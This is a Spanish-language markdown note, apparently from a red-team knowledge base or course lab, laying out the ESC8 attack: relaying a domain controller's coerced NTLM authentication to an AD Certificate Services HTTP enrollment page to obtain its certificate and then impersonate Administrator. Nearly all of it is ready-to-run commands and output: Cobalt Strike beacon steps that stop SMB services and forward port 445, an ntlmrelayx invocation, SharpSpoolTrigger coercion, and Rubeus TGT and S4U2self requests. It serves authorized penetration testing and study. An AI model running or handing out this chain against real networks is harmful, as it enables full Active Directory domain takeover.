---
tags: [ad, adcs, esc8, ntlm-relay, certificates]
status: completo
---

# ESC8 — NTLM Relay to ADCS HTTP Endpoints

> Si la CA tiene web enrollment (`/certsrv/`) sobre HTTP sin Channel Binding, se puede relay NTLM para obtener un certificado como el DC → TGT del DC → S4U2self como DA.

## Condiciones necesarias

- CA con `Legacy ASP Enrollment Website` en HTTP (no HTTPS con Channel Binding)
- Capacidad de forzar autenticación del objetivo (SpoolSample/PetitPotam)

## Detección

```
beacon> execute-assembly Certify.exe enum-cas --filter-vulnerable --hide-admins --quiet

Vulnerabilities
  ESC8 : The CA supports HTTP web enrollment without channel binding.
Legacy ASP Enrollment Website : http://lon-cs-1.contoso.com/certsrv/
```

## Setup del ataque

### 1 — Liberar puerto 445 en la máquina comprometida

```
# Primero validar que 445 está ocupado por el kernel (PID 4)
beacon> netstat

# Deshabilitar auto-restart de lanmanserver
beacon> sc_config lanmanserver "C:\Windows\system32\svchost.exe -k netsvcs -p" 1 4

# Parar servicios en orden
beacon> sc_stop lanmanserver
beacon> sc_stop srv2
beacon> sc_stop srvnet
```

> ⚠️ Esto rompe todas las conexiones SMB activas (file shares, SMB beacons). No usar en máquinas críticas.

### 2 — Reverse port forward 445 → kali:7445

```
beacon> rportfwd_local 445 localhost 7445
# Puerto 445 ahora escucha con PID del beacon
```

### 3 — SOCKS proxy para el relay

```
beacon> socks 1080 socks5
```

### 4 — ntlmrelayx en Kali (Docker)

```bash
proxychains impacket-ntlmrelayx \
  -t http://10.10.120.5/certsrv/certfnsh.asp \
  -smb2support \
  --adcs \
  --template DomainController
```

### 5 — Forzar autenticación del DC

```
beacon> execute-assembly SharpSpoolTrigger.exe 10.10.120.1 10.10.121.108
# 10.10.120.1 = IP del DC
# 10.10.121.108 = IP de la máquina comprometida (donde escucha el 445)
```

### Resultado

```
[*] http://CONTOSO/LON-DC-1$@10.10.120.5 [1] -> GOT CERTIFICATE! ID 3
[*] Writing PKCS#12 certificate to ./LON-DC-1.pfx
```

### 6 — Usar el certificado del DC → TGT → S4U2self

```
beacon> execute-assembly Rubeus.exe asktgt \
  /user:LON-DC-1$ \
  /domain:CONTOSO.COM \
  /certificate:<PFX_base64> \
  /enctype:aes256 /nowrap

# Con el TGT del DC → S4U2self como Administrator (ver [[S4U2Self]])
beacon> execute-assembly Rubeus.exe s4u \
  /impersonateuser:Administrator \
  /self /altservice:cifs/lon-dc-1 \
  /ticket:<TGT_DC_b64> /nowrap
```

## Ver también

- [[05-ad-attacks/kerberos/s4u2self|S4U2Self]] — usar TGT de máquina para obtener ST como admin
- [[05-ad-attacks/adcs|ADCS]]
